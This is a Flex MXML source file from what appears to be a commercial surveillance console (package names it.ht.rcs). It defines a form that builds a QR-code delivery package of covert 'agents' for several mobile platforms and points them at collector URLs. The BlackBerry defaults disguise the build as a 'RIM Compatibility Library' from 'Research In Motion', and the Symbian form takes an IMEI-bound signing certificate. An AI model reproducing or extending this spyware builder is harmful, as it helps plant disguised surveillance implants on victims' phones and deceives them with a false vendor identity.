<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
  
  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.monitor.controller.LicenseManager;
      import it.ht.rcs.console.network.controller.CollectorManager;
      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
      import it.ht.rcs.console.task.controller.DownloadManager;
      import it.ht.rcs.console.utils.AlertPopUp;
      
      import locale.R;
      
      import mx.collections.ListCollectionView;
      import mx.core.UIComponent;
      import mx.managers.PopUpManager;
      import mx.rpc.events.FaultEvent;
      import mx.rpc.events.ResultEvent;
      
      [Bindable]
      private var urls:ListCollectionView;
      
      private var params:Object;
      
      private var platforms:Array;
      
      public function set platform(value:*):void {
        if (value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
          currentState = value;
        else
          currentState = 'all';
        
        // get the list of entry points 
        CollectorManager.instance.refresh();
        urls = CollectorManager.instance.getEntryPointsView();
        
        if (value == null)
          return;
        
        if (value == 'multiplatform')
          platforms = ['blackberry', 'android', 'symbian', 'winmo'];
        else          
          platforms = [value];
        
        createBtn.platforms = platforms;
                
      }
      
      private var fileReference:FileReference;
      
      private function browse():void
      {
        fileReference = new FileReference();
        fileReference.addEventListener(Event.SELECT, uploadCert);
        fileReference.browse();
      }
      
      private var uploadPopup:UploadPopup;
      private function uploadCert(event:Event):void
      {
        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
        
        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
        uploadPopup.fileReference = fileReference;
        PopUpManager.centerPopUp(uploadPopup);
      }
      
      private function onUploadComplete(event:DataEvent):void
      {
        PopUpManager.removePopUp(uploadPopup);
        
        params['sign']['cert'] = event.data;
      }
      
      private function onUploadError(event:Event):void
      {
        PopUpManager.removePopUp(uploadPopup);
        AlertPopUp.show(event.type);
      }
      
      private function collName(o:Object):String
      {
        // TODO: instead of this check, filter only valid collectors
        if (o != null && o['address'] != '')
          return "http://" + o['address']  + '/';
        
        return 'invalid address';
      }
      
      protected function send():void
      {        
        params = {platform: 'qrcode', deliver: {}, generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, melt: { appname: appname.text }, sign: {} } };
        
        if (currentState == 'blackberry') {
          params['generate']['binary']['name'] = nameForm.text;
          params['generate']['binary']['desc'] = descForm.text;
          params['generate']['binary']['vendor'] = vendorForm.text;
          params['generate']['binary']['version'] = versionForm.text;
        }
        
        if (currentState == 'symbian') {
          params['generate']['sign']['edition'] = edition.selectedItem;
        }

        if (currentState == 'multiplatform') {
          params['generate']['platforms'] = ['blackberry', 'android', 'winmo'];
        }
        
        params['factory'] = {_id: parentDocument.factory._id};
        params['generate']['link'] = url.selectedItem + appname.text;
        
        DownloadManager.instance.createTask("build", parentDocument.factory.name + '_qrcode.zip', params, onSuccess, onFailure);
      }
      
      private function onSuccess(e:ResultEvent):void
      {
        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
      }
      
      private function onFailure(e:FaultEvent):void
      {
        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
      }
    ]]>
  </fx:Script>
  
  <fx:Declarations>
    <s:RadioButtonGroup id="Service"/>
  </fx:Declarations>
  
  <s:states>
    <s:State name='all'/>
    <s:State name='multiplatform'/>
    <s:State name='blackberry'/>
    <s:State name='symbian'/>
  </s:states>
  
  <s:Form left="10" top="10">
    <s:FormItem label="Application Name">    
      <s:TextInput id="appname" text="installer"/>
    </s:FormItem>
    <s:FormItem label="URL">    
      <s:ComboBox id="url" dataProvider="{urls}" labelFunction="collName"/>
    </s:FormItem>
  </s:Form>
  
  <s:Form includeIn="blackberry" left="10" top="105">
    <s:FormItem label="Name">    
      <s:TextInput id="nameForm" text="RIM Compatibility Library" width="150"/>
    </s:FormItem>
    <s:FormItem label="Description">        
      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="200"/>
    </s:FormItem>
    <s:FormItem label="Vendor">       
      <s:TextInput id="vendorForm" text="Research In Motion" width="150"/>
    </s:FormItem>
    <s:FormItem label="Version">       
      <s:TextInput id="versionForm" text="1.1.0" width="100"/>
    </s:FormItem>
  </s:Form>
  
  <s:Form includeIn="symbian" left="10" top="105">
    <s:FormItem label="Certificate bound to phone IMEI">    
      <s:Button width="80" label="{R.get('BROWSE')}" click="browse()"/>
    </s:FormItem>
    <s:FormItem label="S60 Edition">
      <s:DropDownList id="edition" selectedIndex="0" width="80">
        <mx:ArrayCollection>
          <fx:String>5th3rd</fx:String>
          <fx:String>3rd</fx:String>
          <fx:String>5th</fx:String>
        </mx:ArrayCollection>
      </s:DropDownList>
    </s:FormItem>
  </s:Form>
  
  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{send}"/>
  
</s:Group>